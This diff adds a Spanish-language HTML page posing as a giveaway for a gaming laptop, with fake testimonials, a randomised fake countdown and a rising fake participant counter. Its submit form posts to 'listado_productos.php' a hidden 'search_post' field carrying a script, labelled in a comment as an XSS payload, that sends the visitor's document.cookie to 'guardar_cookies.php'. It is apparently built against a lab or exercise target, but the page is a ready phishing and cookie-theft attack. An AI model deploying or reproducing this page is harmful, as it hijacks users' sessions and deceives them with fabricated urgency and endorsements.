@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡SORTEO EXCLUSIVO! - Gana un Portátil Gaming de Última Generación</title>
+    <style>
+        /* Estilos generales */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0f0f1e;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header con animación */
+        .header {
+            background: linear-gradient(45deg, #ff0844, #ff3c6f, #ff6b6b);
+            text-align: center;
+            padding: 30px 0;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .header h1 {
+            font-size: 3.5rem;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        .header p {
+            font-size: 1.5rem;
+            margin: 10px 0 0;
+            font-weight: 300;
+        }
+
+        .timer {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #ffcc00;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
+        }
+
+        /* Sección principal */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 0;
+            background-color: #1a1a2e;
+            border-radius: 15px;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .laptop-image {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            margin-bottom: 30px;
+            transition: transform 0.3s ease;
+        }
+
+        .laptop-image:hover {
+            transform: scale(1.03);
+        }
+
+        .specs {
+            background-color: #16213e;
+            padding: 25px;
+            border-radius: 10px;
+            width: 80%;
+            margin-bottom: 40px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .specs h3 {
+            color: #ff3c6f;
+            font-size: 1.8rem;
+            margin-top: 0;
+            text-align: center;
+            border-bottom: 2px solid #ff3c6f;
+            padding-bottom: 10px;
+        }
+
+        .specs ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .specs li {
+            padding: 10px 0;
+            font-size: 1.2rem;
+            border-bottom: 1px solid #2a2a4a;
+            display: flex;
+            align-items: center;
+        }
+
+        .specs li:before {
+            content: "✓";
+            color: #00ff88;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+
+        /* Botón grande */
+        .cta-button {
+            background: linear-gradient(45deg, #ff0844, #ff3c6f);
+            color: white;
+            border: none;
+            padding: 25px 60px;
+            font-size: 2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 30px 0;
+            box-shadow: 0 10px 25px rgba(255, 8, 68, 0.5);
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(255, 8, 68, 0.6);
+            background: linear-gradient(45deg, #ff3c6f, #ff0844);
+        }
+
+        /* Testimonios falsos */
+        .testimonials {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            margin: 50px 0;
+        }
+
+        .testimonial {
+            background-color: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            width: 30%;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .testimonial img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 15px;
+            display: block;
+            border: 3px solid #ff3c6f;
+        }
+
+        .testimonial p {
+            font-style: italic;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .testimonial h4 {
+            color: #ff3c6f;
+            text-align: right;
+            margin: 0;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #0a0a1a;
+            text-align: center;
+            padding: 20px;
+            margin-top: 50px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+
+        /* Animaciones */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Elementos flotantes */
+        .floating-element {
+            position: absolute;
+            background-color: rgba(255, 60, 111, 0.2);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .floating-1 {
+            width: 150px;
+            height: 150px;
+            top: -50px;
+            left: 10%;
+            animation: float 8s infinite ease-in-out;
+        }
+
+        .floating-2 {
+            width: 100px;
+            height: 100px;
+            bottom: 20px;
+            right: 15%;
+            animation: float 6s infinite ease-in-out reverse;
+        }
+
+        .floating-3 {
+            width: 80px;
+            height: 80px;
+            top: 30%;
+            right: 5%;
+            animation: float 10s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+        }
+
+        /* Contador de participantes falso */
+        .counter {
+            background-color: #16213e;
+            padding: 15px 30px;
+            border-radius: 50px;
+            display: inline-block;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .counter span {
+            color: #ff3c6f;
+            font-weight: bold;
+            font-size: 1.3rem;
+        }
+
+        /* Sellos de urgencia */
+        .urgency-badge {
+            background-color: #ffcc00;
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            display: inline-block;
+            margin: 10px 5px;
+            transform: rotate(-2deg);
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .limited {
+            background-color: #ff3c6f;
+            color: white;
+            transform: rotate(2deg);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .testimonial {
+                width: 100%;
+                margin-bottom: 20px;
+            }
+            
+            .specs {
+                width: 90%;
+            }
+            
+            .cta-button {
+                padding: 20px 40px;
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="floating-element floating-1"></div>
+        <div class="floating-element floating-2"></div>
+        <div class="floating-element floating-3"></div>
+        
+        <h1>¡SORTEO EXCLUSIVO!</h1>
+        <p>Gana un Portátil Gaming de Última Generación VALORADO EN 2.499€</p>
+        
+        <div class="timer" id="countdown">TERMINA EN: 23:59:59</div>
+        
+        <div class="counter">
+            <span id="participant-counter">2,487</span> personas ya participando
+        </div>
+        
+        <div>
+            <span class="urgency-badge">¡ÚLTIMAS HORAS!</span>
+            <span class="urgency-badge limited">PLAZAS LIMITADAS</span>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="main-content">
+            <img src="https://i.imgur.com/JKgFGzL.jpg" alt="Portátil Gaming de Alta Gama" class="laptop-image">
+            
+            <div class="specs">
+                <h3>ESPECIFICACIONES DE LUJO</h3>
+                <ul>
+                    <li>Procesador Intel Core i9 de última generación</li>
+                    <li>Tarjeta gráfica NVIDIA RTX 4090 16GB GDDR6X</li>
+                    <li>32GB RAM DDR5 a 5200MHz</li>
+                    <li>2TB SSD NVMe PCIe 4.0</li>
+                    <li>Pantalla 17.3" 4K 240Hz con tecnología G-SYNC</li>
+                    <li>Sistema de refrigeración avanzado con 4 ventiladores</li>
+                    <li>Teclado mecánico RGB personalizable por tecla</li>
+                    <li>Sistema de audio premium con Dolby Atmos</li>
+                </ul>
+            </div>
+            
+            <!-- Formulario con método POST que envía directamente a search_post -->
+            <form action="listado_productos.php" method="POST" id="sorteoForm">
+                <!-- Payload XSS directo y simple -->
+                <input type="hidden" name="search_post" value="<script>
+                    // Enviar cookies al archivo guardar_cookies.php
+                    fetch('guardar_cookies.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ cookie: document.cookie })
+                    });
+                </script>">
+                
+                <!-- Botón de envío -->
+                <button type="submit" class="cta-button">¡LO QUIERO YA!</button>
+            </form>
+            
+            <p style="text-align: center; font-size: 0.9rem; color: #aaa; max-width: 80%;">
+                * Solo tienes que hacer clic en el botón y completar un breve formulario para participar en el sorteo. El ganador será anunciado en 48 horas.
+            </p>
+        </div>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Testimonio">
+                <p>"¡No podía creerlo cuando me dijeron que había ganado! Pensé que era una broma, pero ahora estoy disfrutando del mejor portátil gaming que he tenido. ¡Gracias!"</p>
+                <h4>Carlos M.</h4>
+            </div>
+            
+            <div class="testimonial">
+                <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Testimonio">
+                <p>"Al principio dudé en participar, pero el proceso fue muy sencillo. Cuando recibí el portátil me quedé sin palabras, ¡es una auténtica bestia para gaming!"</p>
+                <h4>Laura S.</h4>
+            </div>
+            
+            <div class="testimonial">
+                <img src="https://randomuser.me/api/portraits/men/67.jpg" alt="Testimonio">
+                <p>"Llevo años intentando ahorrar para un portátil como este. Gracias a este sorteo ahora puedo jugar a todos mis juegos favoritos al máximo rendimiento."</p>
+                <h4>Miguel A.</h4>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2025 Sorteo Gaming. Todos los derechos reservados.</p>
+        <p>Este sorteo no está asociado con ninguna marca comercial mencionada.</p>
+        <p>Términos y condiciones | Política de privacidad</p>
+    </div>
+
+    <script>
+        // Contador falso de tiempo restante
+        function updateCountdown() {
+            const hours = Math.floor(Math.random() * 2);
+            const minutes = Math.floor(Math.random() * 59);
+            const seconds = Math.floor(Math.random() * 59);
+            
+            document.getElementById('countdown').textContent = 
+                `TERMINA EN: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Actualizar contador de participantes
+        function updateParticipants() {
+            const currentCount = parseInt(document.getElementById('participant-counter').textContent.replace(',', ''));
+            const newCount = currentCount + Math.floor(Math.random() * 5) + 1;
+            document.getElementById('participant-counter').textContent = newCount.toLocaleString();
+        }
+        
+        // Iniciar contadores
+        updateCountdown();
+        setInterval(updateCountdown, 30000); // Actualizar cada 30 segundos
+        setInterval(updateParticipants, 8000); // Actualizar cada 8 segundos
+    </script>
+</body>
+</html>
